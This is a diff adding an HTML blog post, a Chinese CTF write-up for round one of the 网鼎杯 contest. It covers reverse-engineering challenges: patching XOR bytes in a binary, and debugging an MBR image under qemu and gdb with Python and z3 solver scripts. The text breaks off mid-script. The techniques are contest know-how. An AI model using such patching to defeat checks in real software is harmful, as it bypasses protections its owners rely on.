@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="自己是第四场，先做做其他场的题目 0x01 Beijing签到题目看到输出是 1sub_8048460(dword_804A03C) 即一个函数处理一个数组且函数内部主要是switch返回预先定义的数组前后byte异或： 123456789101112131415161718192021switch ( a1 )  &amp;#123;    case 0:      v2 &#x3D; byte_804">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯第一场_Re&amp;&amp;部分Pwn">
+<meta property="og:url" content="http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="自己是第四场，先做做其他场的题目 0x01 Beijing签到题目看到输出是 1sub_8048460(dword_804A03C) 即一个函数处理一个数组且函数内部主要是switch返回预先定义的数组前后byte异或： 123456789101112131415161718192021switch ( a1 )  &amp;#123;    case 0:      v2 &#x3D; byte_804">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-4a81915e82cd8f63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-ff27623aed1f3aa2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-5983d06073298edf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2018-08-21T10:26:47.000Z">
+<meta property="article:modified_time" content="2018-08-24T09:58:02.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Re">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-4a81915e82cd8f63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>网鼎杯第一场_Re&amp;&amp;部分Pwn</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/08/18/ret2-dl-runtime-resolve/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&text=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&is_video=false&description=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯第一场_Re&amp;&amp;部分Pwn&body=Check out this article: http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&name=网鼎杯第一场_Re&amp;&amp;部分Pwn&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Beijing"><span class="toc-number">1.</span> <span class="toc-text">0x01 Beijing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-blend"><span class="toc-number">2.</span> <span class="toc-text">0x02 blend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-advanced"><span class="toc-number">3.</span> <span class="toc-text">0x03 advanced</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-guess"><span class="toc-number">4.</span> <span class="toc-text">0x04 guess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-blind"><span class="toc-number">5.</span> <span class="toc-text">0x05 blind</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        网鼎杯第一场_Re&amp;&amp;部分Pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-08-21T10:26:47.000Z" itemprop="datePublished">2018-08-21</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link" href="/tags/Re/" rel="tag">Re</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>自己是第四场，先做做其他场的题目</p>
+<h3 id="0x01-Beijing"><a href="#0x01-Beijing" class="headerlink" title="0x01 Beijing"></a>0x01 Beijing</h3><p>签到题目<br>看到输出是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_8048460(dword_804A03C)</span><br></pre></td></tr></table></figure>
+<p>即一个函数处理一个数组<br>且函数内部主要是switch返回预先定义的数组前后byte异或：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">switch ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    case 0:</span><br><span class="line">      v2 &#x3D; byte_804A021 ^ byte_804A020;</span><br><span class="line">      break;</span><br><span class="line">    case 1:</span><br><span class="line">      v2 &#x3D; byte_804A023 ^ byte_804A022;</span><br><span class="line">      break;</span><br><span class="line">    case 2:</span><br><span class="line">      v2 &#x3D; byte_804A025 ^ byte_804A024;</span><br><span class="line">      break;</span><br><span class="line">    case 13:</span><br><span class="line">      v2 &#x3D; byte_804A03B ^ byte_804A03A;</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      v2 &#x3D; 0;</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>动态调试看到进入switch后前四次的异或的第二个字节分别为”f”、”l”,”a”,”g”,猜测每组异或前一个是干扰项,将byte_804A021、 byte_804A023、byte_804A025……改为0，patch好程序后，再次运行即得flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;amazing_beijing&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-blend"><a href="#0x02-blend" class="headerlink" title="0x02 blend"></a>0x02 blend</h3><p>首先这类似之前的一道题目(改了一些数据)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TechSecCTF&#x2F;writeups&#x2F;blob&#x2F;master&#x2F;CSAWQuals2017&#x2F;realism&#x2F;README.md</span><br></pre></td></tr></table></figure>
+<p>跟着再学习一下：<br>安装qemu：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure>
+<p>首先运行程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -drive format&#x3D;raw,file&#x3D;main.bin</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-4a81915e82cd8f63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="qemu"><br>拖进IDA，16-bit mode下打开：<br>看到flag-checking bit：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seg000:0066                 cmp     byte ptr ds:7DC8h, 13h</span><br><span class="line">seg000:006B                 jle     loc_10D</span><br><span class="line">seg000:006F                 cmp     dword ptr ds:1234h, 67616C66h</span><br><span class="line">seg000:0078                 jnz     loc_14D</span><br><span class="line">seg000:007C                 movaps  xmm0, xmmword ptr ds:1238h</span><br><span class="line">seg000:0081                 movaps  xmm5, xmmword ptr ds:7C00h</span><br><span class="line">seg000:0086                 pshufd  xmm0, xmm0, 1Eh</span><br><span class="line">seg000:008B                 mov     si, 8</span><br></pre></td></tr></table></figure>
+<p>其比较我们的输入(0x1234h)和67616C66h(“flag”)<br>调试一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -drive  format&#x3D;raw,file&#x3D;.&#x2F;main.bin  -s</span><br></pre></td></tr></table></figure>
+<p>gdb下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#39;target remote localhost:1234&#39; \</span><br><span class="line">    -ex &#39;set architecture i8086&#39; \</span><br><span class="line">    -ex &#39;break *0x7c6f&#39; \</span><br><span class="line">    -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
+<p>(mbr的加载起始地址为0x7c00)<br>可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p $xmm0</span><br><span class="line">$3 &#x3D; &#123;</span><br><span class="line">  v4_float &#x3D; &#123;4.17598837e+21, 1.08801462e+24, 2.83386409e+26, 1.98077759e+37&#125;, </span><br><span class="line">  v2_double &#x3D; &#123;1.2473230926066787e+190, 1.5546445437344775e+296&#125;, </span><br><span class="line">  v16_int8 &#x3D; &#123;0x7b, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, </span><br><span class="line">    0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x7d&#125;, </span><br><span class="line">  v8_int16 &#x3D; &#123;0x617b, 0x6362, 0x6564, 0x6766, 0x6968, 0x6b6a, 0x6d6c, 0x7d6e&#125;, </span><br><span class="line">  v4_int32 &#x3D; &#123;0x6362617b, 0x67666564, 0x6b6a6968, 0x7d6e6d6c&#125;, </span><br><span class="line">  v2_int64 &#x3D; &#123;0x676665646362617b, 0x7d6e6d6c6b6a6968&#125;, </span><br><span class="line">  uint128 &#x3D; 0x7d6e6d6c6b6a6968676665646362617b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p $xmm5</span><br><span class="line">$4 &#x3D; &#123;</span><br><span class="line">  v4_float &#x3D; &#123;-134298496, -2.50091934, -1.48039995e-36, 1.93815862e-18&#125;, </span><br><span class="line">  v2_double &#x3D; &#123;-8.0294250547975565, 1.241726856953559e-144&#125;, </span><br><span class="line">  v16_int8 &#x3D; &#123;0xb8, 0x13, 0x0, 0xcd, 0x10, 0xf, 0x20, 0xc0, 0x83, 0xe0, 0xfb, </span><br><span class="line">    0x83, 0xc8, 0x2, 0xf, 0x22&#125;, </span><br><span class="line">  v8_int16 &#x3D; &#123;0x13b8, 0xcd00, 0xf10, 0xc020, 0xe083, 0x83fb, 0x2c8, 0x220f&#125;, </span><br><span class="line">  v4_int32 &#x3D; &#123;0xcd0013b8, 0xc0200f10, 0x83fbe083, 0x220f02c8&#125;, </span><br><span class="line">  v2_int64 &#x3D; &#123;0xc0200f10cd0013b8, 0x220f02c883fbe083&#125;, </span><br><span class="line">  uint128 &#x3D; 0x220f02c883fbe083c0200f10cd0013b8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其实就是这里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:007C                 movaps  xmm0, xmmword ptr ds:1238h</span><br><span class="line">seg000:0081                 movaps  xmm5, xmmword ptr ds:7C00h</span><br></pre></td></tr></table></figure>
+<p>xmm0保存我们输入flag后面的字符<br>xmm5保存mbr开始的字符<br>可以调试后<br>剩下分析的便和开始提到的题相同：<br>解题脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"># Initial value of xmm5</span><br><span class="line">xmm5_start &#x3D; binascii.unhexlify(&#39;220f02c883fbe083c0200f10cd0013b8&#39;)</span><br><span class="line"></span><br><span class="line"># The data stored at 0x7DA8 and compared against esi</span><br><span class="line">esi_consts &#x3D; [</span><br><span class="line">                &#39;F602DD02&#39;,</span><br><span class="line">                &#39;E802DC02&#39;,</span><br><span class="line">                &#39;ED02D802&#39;,</span><br><span class="line">                &#39;E202CE02&#39;,</span><br><span class="line">                &#39;E202C402&#39;,</span><br><span class="line">                &#39;DB02D402&#39;,</span><br><span class="line">                &#39;CD02D902&#39;,</span><br><span class="line">                &#39;04031103&#39;</span><br><span class="line">              ]</span><br><span class="line">esi_consts &#x3D; [struct.unpack(&#39;&lt;I&#39;, binascii.unhexlify(c))[0] for c in esi_consts]</span><br><span class="line">esi_consts &#x3D; esi_consts[::-1]</span><br><span class="line"></span><br><span class="line"># Our 16 variables (&#39;a&#39; through &#39;p&#39;)</span><br><span class="line">variables &#x3D; [chr(ord(&#39;a&#39;) + i) for i in range(16)]</span><br><span class="line"></span><br><span class="line">def esi_to_xmm5(esi):</span><br><span class="line">  s1 &#x3D; esi % (1 &lt;&lt; 0x10)</span><br><span class="line">  s2 &#x3D; (esi - s1) &gt;&gt; (0x10)</span><br><span class="line">  w &#x3D; struct.pack(&#39;&gt;Q&#39;, s1) + struct.pack(&#39;&gt;Q&#39;, s2)</span><br><span class="line">  return w</span><br><span class="line"></span><br><span class="line">def print_constraints():</span><br><span class="line">  for i in range(8):</span><br><span class="line">    prev_esi &#x3D; esi_consts[i-1]</span><br><span class="line">    xmm5 &#x3D; esi_to_xmm5(prev_esi)</span><br><span class="line">    if i &#x3D;&#x3D; 0:</span><br><span class="line">      xmm5 &#x3D; xmm5_start</span><br><span class="line"></span><br><span class="line">    esi &#x3D; esi_consts[i]</span><br><span class="line">    s1 &#x3D; esi % (1 &lt;&lt; 0x10)</span><br><span class="line">    s2 &#x3D; (esi - s1) &gt;&gt; (0x10)</span><br><span class="line"></span><br><span class="line">    # sum of absolute differences between xmm5 and our flag</span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(8):</span><br><span class="line">      if j &#x3D;&#x3D; 7-i:</span><br><span class="line">        # This is the masking step</span><br><span class="line">        s +&#x3D; &#39;abs(0-&#39; + str(ord(xmm5[j])) + &#39;) + &#39;</span><br><span class="line">        continue</span><br><span class="line">      s +&#x3D; &#39;abs(&#39; + variables[j] + &#39;-&#39; + str(ord(xmm5[j])) + &#39;) + &#39;</span><br><span class="line">    s +&#x3D; &#39;0 &#x3D;&#x3D; &#123;&#125;, &#39;.format(s1)</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(8,16):</span><br><span class="line">      if j-8 &#x3D;&#x3D; 7-i:</span><br><span class="line">        # This is the masking step</span><br><span class="line">        s +&#x3D; &#39;abs(0-&#39; + str(ord(xmm5[j])) + &#39;) + &#39;</span><br><span class="line">        continue</span><br><span class="line">      s +&#x3D; &#39;abs(&#39; + variables[j] + &#39;-&#39; + str(ord(xmm5[j])) + &#39;) + &#39;</span><br><span class="line">    s +&#x3D; &#39;0 &#x3D;&#x3D; &#123;&#125;, &#39;.format(s2)</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">  print_constraints()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.append(&#39;z3&#x2F;build&#x2F;&#39;)</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">def abs(x):</span><br><span class="line">  return If(x &gt;&#x3D; 0,x,-x)</span><br><span class="line"></span><br><span class="line">s &#x3D; Solver()</span><br><span class="line"></span><br><span class="line">a &#x3D; Int(&#39;a&#39;)</span><br><span class="line">b &#x3D; Int(&#39;b&#39;)</span><br><span class="line">c &#x3D; Int(&#39;c&#39;)</span><br><span class="line">d &#x3D; Int(&#39;d&#39;)</span><br><span class="line">e &#x3D; Int(&#39;e&#39;)</span><br><span class="line">f &#x3D; Int(&#39;f&#39;)</span><br><span class="line">g &#x3D; Int(&#39;g&#39;)</span><br><span class="line">h &#x3D; Int(&#39;h&#39;)</span><br><span class="line">i &#x3D; Int(&#39;i&#39;)</span><br><span class="line">j &#x3D; Int(&#39;j&#39;)</span><br><span class="line">k &#x3D; Int(&#39;k&#39;)</span><br><span class="line">l &#x3D; Int(&#39;l&#39;)</span><br><span class="line">m &#x3D; Int(&#39;m&#39;)</span><br><span class="line">n &#x3D; Int(&#39;n&#39;)</span><br><span class="line">o &#x3D; Int(&#39;o&#39;)</span><br><span class="line">p &#x3D; Int(&#39;p&#39;)</span><br><span class="line"></span><br><span class="line">s.add(a &gt;&#x3D; 32)</span><br><span class="line">s.add(b &gt;&#x3D; 32)</span><br><span class="line">s.add(c &gt;&#x3D; 32)</span><br><span class="line">s.add(d &gt;&#x3D; 32)</span><br><span class="line">s.add(e &gt;&#x3D; 32)</span><br><span class="line">s.add(f &gt;&#x3D; 32)</span><br><span class="line">s.add(g &gt;&#x3D; 32)</span><br><span class="line">s.add(h &gt;&#x3D; 32)</span><br><span class="line">s.add(i &gt;&#x3D; 32)</span><br><span class="line">s.add(j &gt;&#x3D; 32)</span><br><span class="line">s.add(k &gt;&#x3D; 32)</span><br><span class="line">s.add(l &gt;&#x3D; 32)</span><br><span class="line">s.add(m &gt;&#x3D; 32)</span><br><span class="line">s.add(n &gt;&#x3D; 32)</span><br><span class="line">s.add(o &gt;&#x3D; 32)</span><br><span class="line">s.add(p &gt;&#x3D; 32)</span><br><span class="line"></span><br><span class="line">s.add(127 &gt; a)</span><br><span class="line">s.add(127 &gt; b)</span><br><span class="line">s.add(127 &gt; c)</span><br><span class="line">s.add(127 &gt; d)</span><br><span class="line">s.add(127 &gt; e)</span><br><span class="line">s.add(127 &gt; f)</span><br><span class="line">s.add(127 &gt; g)</span><br><span class="line">s.add(127 &gt; h)</span><br><span class="line">s.add(127 &gt; i)</span><br><span class="line">s.add(127 &gt; j)</span><br><span class="line">s.add(127 &gt; k)</span><br><span class="line">s.add(127 &gt; l)</span><br><span class="line">s.add(127 &gt; m)</span><br><span class="line">s.add(127 &gt; n)</span><br><span class="line">s.add(127 &gt; o)</span><br><span class="line">s.add(127 &gt; p)</span><br><span class="line"></span><br><span class="line">s.add(abs(a-34) + abs(b-15) + abs(c-2) + abs(d-200) + abs(e-131) + abs(f-251) + abs(g-224) + abs(0-131) + 0 &#x3D;&#x3D; 772) </span><br><span class="line">s.add(abs(i-192) + abs(j-32) + abs(k-15) + abs(l-16) + abs(m-205) + abs(n-0) + abs(o-19) + abs(0-184) + 0 &#x3D;&#x3D; 785) </span><br><span 